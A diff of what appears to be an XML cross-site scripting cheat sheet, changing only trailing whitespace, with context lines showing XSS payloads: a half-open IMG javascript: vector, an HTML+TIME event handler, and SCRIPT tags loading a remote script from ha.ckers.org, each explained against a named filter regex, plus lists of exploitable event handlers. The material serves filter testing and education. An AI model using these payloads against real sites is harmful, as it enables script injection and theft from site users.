@@ -133,7 +133,7 @@
 		<desc>INPUT Image</desc>
 
 		<label>HTML Element Attacks</label>
-		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>	
+		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
 	</attack>
 
 	<attack>
@@ -845,7 +845,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 		<name>Half-Open HTML/JavaScript</name>
 		<code>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</code>
 		<desc>Unlike Firefox, the IE rendering engine doesn&apos;t add extra data to your page, but it does allow the &quot;javascript:&quot; directive in images. This is useful as a vector because it doesn&apos;t require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close &gt; tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:
-	/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|>)/ 
+	/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|>)/
 As a side note, this was also effective against a real world XSS filter I came across using an open ended &lt;IFRAME tag instead of an &lt;IMG tag.</desc>
 
 		<label>Embedded Character Attacks</label>
@@ -893,7 +893,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<name>Event Handlers List 1</name>
 		<code>See Below</code>
 		<desc>Event Handlers that can be used in XSS attacks (this is the most comprehensive list on the net, at the time of this writing). Each one may have different results in different browsers. Thanks to Rene Ledosquet (http://www.secaron.de/) for the HTML+TIME updates:
-			
+
 -FSCommand() (execute from within an embedded Flash object)
 
 -onAbort() (when user aborts the loading of an image)
@@ -973,7 +973,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<code>See Below</code>
 
 		<desc>-onEnd() (fires when the timeline ends.  This can be exploited, like most of the HTML+TIME event handlers by doing something like &lt;P STYLE=&quot;behavior:url(&apos;#default#time2&apos;)&quot; onEnd=&quot;alert(&apos;XSS&apos;)&quot;&gt;)
-			
+
 -onError() (loading of a document or image causes an error)
 
 -onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object)
@@ -1048,7 +1048,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<name>Event Handlers List 3</name>
 		<code>See Below</code>
 		<desc>-onRepeat() (fires once for each repetition of the timeline, excluding the first full cycle)
-			
+
 -onReset() (fires when user or attacker resets a form)
 
 -onResize() (user would resize the window; attacker could auto initialize with something like: &lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)
@@ -1116,7 +1116,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<code>&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 		<desc>For performing XSS on sites that allow &quot;&lt;SCRIPT>&quot; but don&apos;t allow &quot;&lt;SCRIPT SRC...&quot; by way of a regex filter:
 	/&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i
-	
+
 (this is an important one, because I&apos;ve seen this regex in the wild)</desc>
 
 		<label>XSS w/HTML Quote Encapsulation</label>
@@ -1137,7 +1137,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<name>Evade Regex Filter 4</name>
 		<code>&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 		<desc>Yet another XSS to evade the same filter:
-	/&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i 
+	/&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i
 The only thing I&apos;ve seen work against this XSS attack if you still want to allow &lt;SCRIPT&gt; tags but not remote scripts is a state machine (and of course there are other ways to get around this if they allow &lt;SCRIPT&gt; tags)</desc>
 
 		<label>XSS w/HTML Quote Encapsulation</label>
